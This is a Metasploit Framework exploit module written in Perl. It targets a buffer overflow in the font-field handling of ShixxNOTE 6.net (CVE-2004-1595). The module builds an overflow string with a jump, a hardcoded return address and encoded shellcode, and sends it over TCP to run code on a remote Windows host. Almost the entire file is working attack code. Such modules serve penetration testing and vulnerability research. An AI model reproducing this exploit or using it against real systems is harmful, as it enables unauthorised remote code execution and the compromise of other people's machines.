
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::shixxnote_font;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{

    'Name'  => 'ShixxNOTE 6.net Font Buffer Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'y0 [at] w00t-shell.net', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'winnt', 'win2000', 'winxp' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 2000],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },
    'AutoOpts' => { 'EXITFUNC' => 'process' },
    'Payload' => {
       'Space'     => 650,
       'BadChars'  => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
       'Prepend'   => "\x81\xc4\xff\xef\xff\xff\x44",
       'Keys'      => ['+ws2ord'],
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
	This module exploits a buffer overflow in ShixxNOTE 6.net. 
	The vulnerability is caused due to boundary errors in the
 	handling of font fields. 
    }),
  
    'Refs'  =>  [  
                     ['CVE', '2004-1595'],
                     ['BID', '11409'],
                ],
    'Targets' => [ 
                     ['ShixxNOTE 6.net Universal', 0x10041951],   
                 ],

    'DefaultTarget' => 0,

    'DisclosureDate' => 'Oct 04 2004',

    'Keys' => ['shixxnote'], 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit 
{
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    my $target = $self->Targets->[$target_idx];

    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
     
     my $sploit = 
       Pex::Text::UpperCaseText(8). "~~". Pex::Text::UpperCaseText(102). 
       "\xeb\x06\x46\x92". pack('V', $target->[1]). $shellcode. 
       Pex::Text::UpperCaseText(200). ("~" x 10); 

$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    $s->Send($sploit);
    $self->Handler($s);
    $s->Close();
    return;
}

1;

